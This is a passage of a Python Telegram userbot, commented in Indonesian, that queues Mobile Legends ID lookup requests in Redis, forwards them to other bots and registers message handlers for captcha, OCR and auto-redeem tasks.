    while True:
        try:
            if not bot_status['in_captcha']:
                req_bytes = r.lindex('pending_requests', 0)
                if req_bytes:
                    req_id = req_bytes if isinstance(req_bytes, str) else req_bytes.decode('utf-8')
                    now = time.time()

                    if req_id in sent_requests and now - sent_requests[req_id] < 15:
                        await asyncio.sleep(2); continue

                    req_json = r.get(req_id)
                    if not req_json:
                        r.lpop('pending_requests'); continue

                    req_data = json.loads(req_json)
                    user_id  = req_data['chat_id']
                    reply_to = req_data.get('reply_to_message_id')

                    if waiting_for_result.get(user_id):
                        r.lpop('pending_requests'); r.rpush('pending_requests', req_id)
                        await asyncio.sleep(5); continue

                    uid = req_data['args'][0]
                    sid = req_data['args'][1]

                    gopay_check = validate_mlbb_gopay_sync(uid, sid)
                    if not gopay_check['status']:
                        await send_status_to_user(user_id, "❌ ID dan Server tidak valid.", reply_to)
                        r.lpop('pending_requests'); r.delete(req_id); continue

                    msg_id = await send_status_to_user(user_id, "⏳ Proses request...", reply_to)
                    if not msg_id:
                        r.lpop('pending_requests'); r.delete(req_id); continue

                    active_requests[req_id] = {
                        'chat_id':    user_id,
                        'message_id': msg_id,
                        'start_time': now,
                        'command':    req_data['command'],
                        'args':       req_data['args']
                    }

                    cmd = f"{req_data['command']} {uid} {sid}"
                    await client.send_message(BOT_A_USERNAME, cmd)
                    logger.info(f"📤 Kirim ke Bot A: {cmd}")

                    if BIND_ENABLED:
                        await client.send_message(BOT_BIND_USERNAME, f"/bind {uid} {sid}")
                        pending_bind[user_id] = {
                            'uid': uid, 'server': sid,
                            'start_time': now, 'status_msg_id': msg_id,
                            'bind_sent_time': now
                        }
                    else:
                        if user_id not in pending_bind_wait:
                            pending_bind_wait[user_id] = asyncio.Event()
                        pending_bind_wait[user_id].set()

                    sent_requests[req_id]       = now
                    waiting_for_result[user_id] = True
            else:
                await asyncio.sleep(1)
        except Exception as e:
            logger.error(f"❌ process_queue: {e}")
        await asyncio.sleep(2)

# ==================== MAIN ====================
async def main():
    logger.info("🚀 Memulai userbot...")
    auto_redeem.load()
    auto_redeem_jebray.load()

    # Bersihkan antrian lama
    try:
        queue_len = r.llen('pending_requests')
        if queue_len > 0:
            logger.info(f"🧹 Membersihkan {queue_len} request lama...")
            for _ in range(queue_len): r.lpop('pending_requests')
        for key in r.keys('req:*'): r.delete(key)
    except Exception as e:
        logger.error(f"❌ Bersih Redis: {e}")

    await client.start()
    me = await client.get_me()
    logger.info(f"✅ Login sebagai: {me.first_name} (@{me.username})")

    # ── Daftarkan semua handler SEKALI (tidak pakai decorator agar tidak double) ──
    client.add_event_handler(message_handler,         events.NewMessage)
    client.add_event_handler(captcha_from_bot_handler,events.NewMessage)
    client.add_event_handler(ocr_result_handler,      events.NewMessage)
    client.add_event_handler(ocr_error_handler,       events.NewMessage)
    client.add_event_handler(auto_redeem_vcr_handler, events.NewMessage)
    client.add_event_handler(auto_redeem_jebray_handler, events.NewMessage)
    client.add_event_handler(userbot_command_handler, events.NewMessage)
    client.add_event_handler(auto_share_handler,      events.NewMessage)

    if BIND_ENABLED:
        client.add_event_handler(bind_response_handler, events.NewMessage)
        client.add_event_handler(bind_response_handler, events.MessageEdited)
        logger.info("✅ Bind handler aktif")

    # Background tasks
    asyncio.create_task(timeout_checker())
    asyncio.create_task(ocr_timeout_checker())

    logger.info("✅ Semua handler terdaftar, mulai proses antrian...")
    await process_queue()

if __name__ == "__main__":
    asyncio.run(main())
